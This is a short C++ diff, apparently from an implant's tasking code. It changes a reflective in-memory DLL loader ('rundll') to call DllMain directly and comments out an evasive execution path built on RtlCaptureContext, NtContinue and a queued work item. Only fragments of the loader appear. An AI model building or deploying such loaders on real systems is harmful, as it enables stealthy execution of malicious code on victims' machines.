@@ -2,7 +2,7 @@
 // Created by diago on 2024-05-27.
 //
 
-#include "injection.hpp"
+#include "../injection.hpp"
 
 bool
 tasking::initialize_dll_info(const std::string &dll_buffer, dll_info *pdll_info) {
@@ -306,8 +306,10 @@ tasking::rundll(const std::string& file_buffer) {
 		return "failed to assign correct memory protections for image sections.";
 	}
 
-
 	fnDllMain pmain		= reinterpret_cast<fnDllMain>(dll.pMappedData + (dll.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
+	pmain(nullptr, DLL_PROCESS_ATTACH, nullptr);
+
+	/*
 	void* pcapture_ctx	= GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlCaptureContext");
 	void* pntcontinue   = GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtContinue");
 
@@ -345,6 +347,6 @@ tasking::rundll(const std::string& file_buffer) {
 	)) {
 		return "failed to queue work item.";
 	}
-
+	*/
 	return "success";
 }
